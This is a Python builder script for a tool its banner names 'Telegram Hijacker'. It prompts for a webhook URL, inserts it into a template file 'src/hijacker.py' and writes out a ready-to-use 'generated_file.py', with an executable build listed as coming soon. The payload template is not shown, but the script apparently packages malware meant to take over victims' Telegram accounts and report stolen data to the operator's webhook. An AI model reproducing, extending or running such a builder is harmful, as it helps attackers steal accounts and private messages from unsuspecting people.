import sys

def create_python_file(hook):
    with open('src/hijacker.py', 'r', encoding='utf-8') as f1:
        content = f1.read()

    updated_content = content.replace("{{HOOK}}", hook)

    with open('generated_file.py', 'w', encoding='utf-8') as f2:
        f2.write(updated_content)

def main():

    RED = "\33[31m"
    logo= f"""
    {RED}
    ▄▄▄█████▓▓█████  ██▓    ▓█████   ▄████  ██▀███  ▄▄▄      ███▄ ▄███▓      ██░ ██  ██▓ ▄▄▄██▀▀▀▄▄▄      ▄████▄   ██ ▄█▀▓█████  ██▀███     
    ▓  ██▒ ▓▒▓█   ▀ ▓██▒    ▓█   ▀  ██▒ ▀█▒▓██ ▒ ██▒████▄   ▓██▒▀█▀ ██▒     ▓██░ ██▒▓██▒   ▒██  ▒████▄   ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒   
    ▒ ▓██░ ▒░▒███   ▒██░    ▒███   ▒██░▄▄▄░▓██ ░▄█ ▒██  ▀█▄ ▓██    ▓██░     ▒██▀▀██░▒██▒   ░██  ▒██  ▀█▄ ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒   
    ░ ▓██▓ ░ ▒▓█  ▄ ▒██░    ▒▓█  ▄ ░▓█  ██▓▒██▀▀█▄ ░██▄▄▄▄██▒██    ▒██      ░▓█ ░██ ░██░▓██▄██▓ ░██▄▄▄▄██▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄     
      ▒██▒ ░ ░▒████▒░██████▒░▒████▒░▒▓███▀▒░██▓ ▒██▒▓█   ▓██▒██▒   ░██▒     ░▓█▒░██▓░██░ ▓███▒   ▓█   ▓██▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒   
      ▒ ░░   ░░ ▒░ ░░ ▒░▓  ░░░ ▒░ ░ ░▒   ▒ ░ ▒▓ ░▒▓░▒▒   ▓▒█░ ▒░   ░  ░      ▒ ░░▒░▒░▓   ▒▓▒▒░   ▒▒   ▓▒█░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░   
        ░     ░ ░  ░░ ░ ▒  ░ ░ ░  ░  ░   ░   ░▒ ░ ▒░ ▒   ▒▒ ░  ░      ░      ▒ ░▒░ ░ ▒ ░ ▒ ░▒░    ▒   ▒▒ ░ ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░   
      ░         ░     ░ ░      ░   ░ ░   ░   ░░   ░  ░   ▒  ░      ░         ░  ░░ ░ ▒ ░ ░ ░ ░    ░   ▒  ░        ░ ░░ ░    ░     ░░   ░    
                ░  ░    ░  ░   ░  ░      ░    ░          ░  ░      ░         ░  ░  ░ ░   ░   ░        ░  ░ ░      ░  ░      ░  ░   ░        
                                                                                                     ░                                  
                                                                @NeoMetalx1"""
    print(logo)

    hook = input("[Enter web hook url]: ")
    
    print("   1. Build python file\n   2. Build exe file")
    user_option = int(input("[Choose option]: "))
    
    if user_option == 1:
        create_python_file(hook)
        print("   File 'generated_file.py' generated!")
    if user_option == 2:
        print("   Coming soon!")

def set_def_color():
    sys.stdout.write("\033[0m")

if __name__ == "__main__":
    main()

set_def_color()
